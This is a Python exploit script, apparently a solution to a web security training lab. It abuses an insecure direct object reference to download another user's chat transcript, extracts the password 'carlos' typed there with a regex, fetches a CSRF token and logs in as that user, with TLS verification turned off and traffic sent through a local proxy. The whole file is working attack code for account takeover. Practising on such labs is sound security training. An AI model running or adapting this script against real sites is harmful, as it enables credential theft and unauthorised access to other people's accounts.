import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def get_csrf_token(s, url):
    login_url = url + "/login"
    r = s.get(login_url, verify=False, proxies=PROXIES)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", { 'name' : 'csrf'})['value']
    return csrf

def login_as_carlos_user(s, url):
    chat_url = url + "/download-transcript/1.txt"
    r = s.get(chat_url, verify=False, proxies=PROXIES)
    res = r.text
    password = re.search("Ok so my password is (.*). Is that right?", res)
    password = password.group(1).strip()

    # lets login with stolen password
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, url)
    login_data = { 'csrf' : csrf_token, 'username' : 'carlos', 'password' : password}
    r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print("(+) Login sucessful!")
    else:
        print("(+) Login failed!")

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
    
    s = requests.Session()
    print('[*] Starting the Exploit : Broken Access Control - User ID controlled by request parameter with password disclosure')
    url = sys.argv[1].rstrip('/')
    login_as_carlos_user(s, url)

if __name__ == "__main__":
    main()